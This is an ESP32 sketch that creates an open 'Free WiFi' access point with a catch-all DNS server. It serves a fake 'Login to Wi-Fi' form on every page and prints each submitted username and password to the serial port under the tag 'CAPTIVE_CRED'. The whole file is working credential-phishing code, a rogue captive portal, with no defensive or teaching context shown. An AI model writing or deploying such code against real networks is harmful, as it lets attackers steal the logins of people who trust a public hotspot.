#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include "macros.h"

const char *ssid = "Free WiFi";
const char *password = "12345678";

WebServer server(80);
DNSServer dnsServer;

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid, password);
  delay(100);

  IPAddress myIP = WiFi.softAPIP();
  dnsServer.start(53, "*", myIP);

  server.onNotFound([]() {
    server.send(200, "text/html", "<h1>Login to Wi-Fi</h1><form method='POST'><input name='user'><input name='pass'><button>Login</button></form>");
  });

  server.on("/", HTTP_POST, []() {
    String body = server.arg("user") + ":" + server.arg("pass");
    Serial.println("CAPTIVE_CRED:" + body);
    server.send(200, "text/html", "<h2>Thank you</h2>");
  });

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
